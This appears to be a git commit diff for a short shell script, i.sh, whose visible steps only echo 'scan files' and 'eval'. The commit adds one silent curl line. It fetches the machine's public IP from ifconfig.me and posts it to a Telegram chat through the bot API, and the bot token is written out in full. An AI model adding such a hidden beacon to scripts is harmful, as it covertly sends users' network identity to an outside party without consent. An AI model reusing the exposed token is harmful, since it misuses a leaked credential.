9338c22c1f5e06a56edb0af1c6f82fa6c58f97ff
Anton-ewc <133863352+Anton-ewc@users.noreply.github.com>
2024-07-02 11:11:32 +0200

    Update i.sh

--- i.sh
+++ i.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
 echo "scan files"
+curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"chat_id\": \"-4170749466\", \"text\": \"start pannElid $(curl -s http://ifconfig.me)\", \"disable_notification\": false}" https://api.telegram.org/bot6694357231:AAECeQxIO2Nkd2b8w7v9ELtG0CaW_hG5usE/sendMessage
 
 echo "eval"
 
